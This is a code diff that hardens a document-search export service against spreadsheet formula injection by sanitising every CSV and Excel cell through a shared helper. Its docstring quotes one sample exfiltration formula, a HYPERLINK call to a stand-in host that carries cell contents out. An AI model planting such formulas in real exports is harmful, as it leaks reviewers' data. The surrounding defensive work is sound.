@@ -25,6 +25,34 @@ except ImportError:
 logger = logging.getLogger(__name__)
 
 
+
+def _safe_cell(value):
+    """Text for a spreadsheet cell, with formula leaders neutralised.
+
+    A CSV or XLSX cell beginning with ``=``, ``+``, ``-`` or ``@`` is a formula
+    to Excel and LibreOffice. ``line_text`` and ``context_before`` are the
+    *content of the ingested documents*, and ``file_name``/``file_path`` come
+    from the operator's disk, so a corpus can carry a line such as
+    ``=HYPERLINK("https://example.invalid/?d="&A1,"open")`` and have it run in
+    the reviewer's spreadsheet. The text leaves this application as data; it
+    must arrive as data. One helper, used by every writer below, keeps the CSV
+    and Excel exports from disagreeing about that.
+    """
+    if not isinstance(value, str):
+        return value
+    from Api.services.document_intelligence import spreadsheet_safe_text
+
+    return spreadsheet_safe_text(value)
+
+
+def _safe_cells(values):
+    return [_safe_cell(value) for value in values]
+
+
+def _safe_row(row):
+    return {key: _safe_cell(value) for key, value in row.items()}
+
+
 class ExportService:
     """
     Service for exporting data in various formats.
@@ -96,7 +124,7 @@ class ExportService:
                         if line_matches:
                             # Write one row per matching line
                             for match in line_matches:
-                                writer.writerow({
+                                writer.writerow(_safe_row({
                                     'file_id': file_id,
                                     'file_name': file_name,
                                     'file_path': file_path,
@@ -110,10 +138,10 @@ class ExportService:
                                     'line_text': match.get('line_text', ''),
                                     'context_before': match.get('context_before', ''),
                                     'context_after': match.get('context_after', '')
-                                })
+                                }))
                         else:
                             # Write one row for file with no line matches
-                            writer.writerow({
+                            writer.writerow(_safe_row({
                                 'file_id': file_id,
                                 'file_name': file_name,
                                 'file_path': file_path,
@@ -127,7 +155,7 @@ class ExportService:
                                 'line_text': '',
                                 'context_before': '',
                                 'context_after': ''
-                            })
+                            }))
                 else:
                     # Standard export - one row per file
                     # Get all possible fieldnames from results
@@ -184,7 +212,7 @@ class ExportService:
                         analyst_cats = result.get('analyst_categories')
                         row['analyst_categories'] = '; '.join(analyst_cats) if isinstance(analyst_cats, (list, tuple)) else (analyst_cats or '')
                         
-                        writer.writerow(row)
+                        writer.writerow(_safe_row(row))
             
             # Convert to BytesIO
             output.seek(0)
@@ -260,21 +288,21 @@ class ExportService:
                         if line_matches:
                             # Write one row per matching line
                             for match in line_matches:
-                                ws.append([
+                                ws.append(_safe_cells([
                                     file_id, file_name, file_path, file_type, file_size,
                                     file_date, file_status, source_name, side_name,
                                     match.get('line_number', ''),
                                     match.get('line_text', ''),
                                     match.get('context_before', ''),
                                     match.get('context_after', '')
-                                ])
+                                ]))
                         else:
                             # Write one row for file with no line matches
-                            ws.append([
+                            ws.append(_safe_cells([
                                 file_id, file_name, file_path, file_type, file_size,
                                 file_date, file_status, source_name, side_name,
                                 '', '', '', ''
-                            ])
+                            ]))
                 else:
                     # Standard export - one row per file
                     # Get all fieldnames
